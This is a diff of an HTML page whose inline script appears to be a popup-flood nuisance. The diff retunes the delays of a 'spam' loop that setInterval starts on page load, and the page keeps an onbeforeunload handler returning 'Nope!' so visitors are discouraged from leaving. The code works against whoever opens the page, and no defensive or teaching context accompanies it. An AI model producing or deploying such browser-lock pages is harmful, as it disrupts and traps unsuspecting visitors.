@@ -1,11 +1,10 @@
-
 <!DOCTYPE html>
 <html lang="en">
   <head>   
     <script>
     let loops = 10
-    let openDelay = 100
-    let closeDelay = 1000
+    let openDelay = 300
+    let closeDelay = 0
     function close(e) {
       e.close()
     }
@@ -20,7 +19,7 @@
     window.addEventListener('load', 
       () => { 
         setInterval(spam, openDelay)
-      });
+      })
       window.onbeforeunload = nope
       function nope() { 
         return "Nope!"
